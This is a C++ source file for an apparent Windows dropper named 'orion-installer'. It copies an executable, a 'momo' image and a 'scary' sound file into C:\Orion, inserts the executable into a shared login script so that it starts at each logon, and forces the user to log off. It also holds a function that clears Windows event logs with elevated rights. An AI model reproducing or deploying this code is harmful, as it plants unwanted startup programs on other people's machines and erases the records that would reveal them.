// orion-installer.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

bool GetModuleDirectory(HMODULE module, std::string *dir_out) {
	if (dir_out == nullptr) {
		return false;
	}
	TCHAR directory[MAX_PATH];
	if (!GetModuleFileName(module, directory, sizeof(directory) / sizeof(TCHAR))) {
		return false;
	}
	USES_CONVERSION;
	std::string directory_str = T2CA(directory);
	size_t separator_idx = directory_str.find_last_of("\\");
	if (separator_idx != std::string::npos && separator_idx != directory_str.length() - 1) {
		directory_str = directory_str.substr(0, separator_idx - 0);
	}
	*dir_out = directory_str;
	return true;
}
int ClearLogs(std::string log) {
	SHELLEXECUTEINFO exec_info;
	exec_info.cbSize = sizeof(SHELLEXECUTEINFO);
	exec_info.fMask = SEE_MASK_NOASYNC | SEE_MASK_NOCLOSEPROCESS;
	exec_info.hwnd = NULL;
	exec_info.lpVerb = TEXT("runas");
	exec_info.lpFile = L"wevtutil";
	USES_CONVERSION;
	exec_info.lpParameters = A2CW(("cl " + log).c_str());
	exec_info.lpDirectory = L"C:\\WINDOWS\\system32";
	exec_info.nShow = SW_SHOWDEFAULT;
	if (!ShellExecuteEx(&exec_info)) {
		return GetLastError();
	}
	WaitForSingleObject(exec_info.hProcess, INFINITE);
	CloseHandle(exec_info.hProcess);
	return 0;
}
int main() {
	USES_CONVERSION;
	CreateDirectory(L"C:\\Orion", NULL);
	std::string path;
	bool success = GetModuleDirectory(NULL, &path);
	if (success) {
		CopyFile(A2CW((path + "\\orion-client.exe").c_str()), L"C:\\Orion\\orion-client.exe", FALSE);
		CopyFile(A2CW((path + "\\momo.bmp").c_str()), L"C:\\Orion\\momo.bmp", FALSE);
		CopyFile(A2CW((path + "\\scary.wav").c_str()), L"C:\\Orion\\scary.wav", FALSE);
		std::ifstream entry_file_in("C:/Users/Public/PublicScript/StartTOK.cmd");
		if (entry_file_in.is_open()) {
			std::vector<std::string> lines;
			std::string line;
			do {
				std::getline(entry_file_in, line);
				lines.push_back(line);
			} while (entry_file_in.good());
			entry_file_in.close();
			std::ofstream entry_file_out("C:/Users/Public/PublicScript/StartTOK.cmd", std::ios::out | std::ios::trunc);
			if (entry_file_out.is_open()) {
				for (size_t i = 0; i < lines.size(); ++i) {
					if (lines[i].find("@echo off")) {
						lines.insert(lines.begin() + i + 1, "C:\\Orion\\orion-client.exe");
						break;
					}
				}
				for (const auto &it : lines) {
					entry_file_out << it << std::endl;
				}
				entry_file_out.close();
			}
			ExitWindows(EWX_LOGOFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER);
		}
	}
    return 0;
}

